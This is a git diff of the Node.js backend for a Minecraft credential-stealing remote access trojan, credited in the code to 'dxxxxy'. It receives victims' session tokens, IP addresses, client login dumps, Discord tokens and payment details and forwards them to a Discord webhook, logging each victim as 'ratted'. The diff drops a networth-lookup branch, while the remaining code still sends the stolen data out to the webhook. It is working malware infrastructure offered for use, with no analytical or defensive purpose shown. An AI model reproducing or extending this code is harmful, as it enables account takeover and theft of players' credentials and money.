@@ -40,8 +40,6 @@ setInterval(() => {
     }
 }, 1000 * 60 * 15)
 
-
-
 //main route, post to this
 app.post("/", (req, res) => {
     //happens if the request does not contain all the required fields, aka someones manually posting to the server
@@ -149,43 +147,6 @@ app.post("/", (req, res) => {
                     checkLunar = `https://hst.sh/${lunar} - **(Lunar3)**`
                 
                 try {
-                    networthCalc(req.body.uuid).then((result) => {
-                        networth = Intl.NumberFormat('en-US', {
-                            notation: 'compact',
-                            maximumFractionDigits: 2,
-                        }).format(result[0]);
-
-                        soulboundnetworth = Intl.NumberFormat('en-US', {
-                            notation: 'compact',
-                            maximumFractionDigits: 2,
-                        }).format(result[1]);
-                        description = result[2];
-
-                        sentnetworth = (Math.trunc(result[0])) / 1000000;
-
-                        post(process.env.WEBHOOK, JSON.stringify({
-                            content: `@everyone - ${soulboundnetworth}(${networth})`, //ping
-                            embeds: [{
-                                title: `Ratted ${req.body.username} - Click For Stats`,
-                                description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**Feather:**\n${checkFeather}\n\n**Essentials:**\n${checkEssentials}\n\n**Lunar:**\n${checkLunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
-                                url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
-                                color: 5814783,
-                                footer: {
-                                    "text": "R.A.T by dxxxxy",
-                                    "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
-                                },
-                                timestamp: new Date()
-                            }],
-                            attachments: []
-                        }), {
-                            headers: {
-                                "Content-Type": "application/json"
-                            }
-                        }).catch(err => {
-                            console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
-                        })
-                    })
-                } catch (e) {
                     post(process.env.WEBHOOK, JSON.stringify({
                         content: `@everyone - no nw chigger)`, //ping
                         embeds: [{
@@ -207,48 +168,10 @@ app.post("/", (req, res) => {
                     }).catch(err => {
                         console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                     })
+                } catch (e) {
+
                     console.log(e)
                 }
-                //send to discord webhook
-                networthCalc(req.body.uuid).then((result) => {
-                    networth = Intl.NumberFormat('en-US', {
-                        notation: 'compact',
-                        maximumFractionDigits: 2,
-                    }).format(result[0]);
-
-                    soulboundnetworth = Intl.NumberFormat('en-US', {
-                        notation: 'compact',
-                        maximumFractionDigits: 2,
-                    }).format(result[1]);
-                    description = result[2];
-
-                    sentnetworth = (Math.trunc(result[0])) / 1000000;
-
-                    post(process.env.WEBHOOK, JSON.stringify({
-                        content: `@everyone - ${soulboundnetworth}(${networth})`, //ping
-                        embeds: [{
-                            title: `Ratted ${req.body.username} - Click For Stats`,
-                            description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**Feather:**\n${checkFeather}\n\n**Essentials:**\n${checkEssentials}\n\n**Lunar:**\n${checkLunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
-                            url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
-                            color: 5814783,
-                            footer: {
-                                "text": "R.A.T by dxxxxy",
-                                "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
-                            },
-                            timestamp: new Date()
-                        }],
-                        attachments: []
-                    }), {
-                        headers: {
-                            "Content-Type": "application/json"
-                        }
-                    }).catch(err => {
-                        console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
-                    })
-
-
-                });
-
             }
 
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
@@ -259,6 +182,7 @@ app.post("/", (req, res) => {
         console.log(`[R.A.T] Error while validating token:\n${err}`)
         console.log(req.body)
     })
+    
     //change this to whatever you want, but make sure to send a response
     res.send("OK")
 })
